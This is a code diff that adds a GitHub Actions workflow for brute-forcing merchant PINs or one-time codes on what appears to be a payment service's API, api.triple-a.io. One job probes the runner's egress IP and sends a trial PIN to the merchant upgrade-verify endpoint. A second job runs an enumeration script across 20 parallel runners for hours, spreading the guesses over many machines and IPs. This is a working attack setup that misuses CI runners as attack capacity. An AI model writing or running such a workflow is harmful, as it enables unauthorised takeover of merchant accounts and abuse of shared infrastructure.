@@ -1,0 +1,43 @@
+name: enum
+on:
+  workflow_dispatch:
+    inputs:
+      key:  {required: true}
+      host: {required: false, default: "api.triple-a.io"}
+      dur:  {required: false, default: "3300"}
+      rate: {required: false, default: "1"}
+permissions:
+  contents: read
+  issues: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: egress ip and probe
+        run: |
+          echo "egress_ip=$(curl -s -m 15 https://api.ipify.org || echo unknown)"
+          curl -s -o /tmp/p.txt -w 'http_code=%{http_code} remote_ip=%{remote_ip}\n' -m 20 \
+            -X PUT "https://${{ inputs.host }}/api/v1/merchant/${{ inputs.key }}/upgrade/verify" \
+            -H 'Content-Type: application/json' --data-binary '{"merchant_pin":"000000"}' || true
+          echo "body: $(head -c 300 /tmp/p.txt)"
+  enum:
+    needs: probe
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+    steps:
+      - uses: actions/checkout@v4
+      - run: python3 otp_enum.py
+        env:
+          TARGET_HOST: ${{ inputs.host }}
+          TARGET_KEY:  ${{ inputs.key }}
+          SHARD: ${{ matrix.shard }}
+          SHARDS: "20"
+          DUR: ${{ inputs.dur }}
+          RATE: ${{ inputs.rate }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
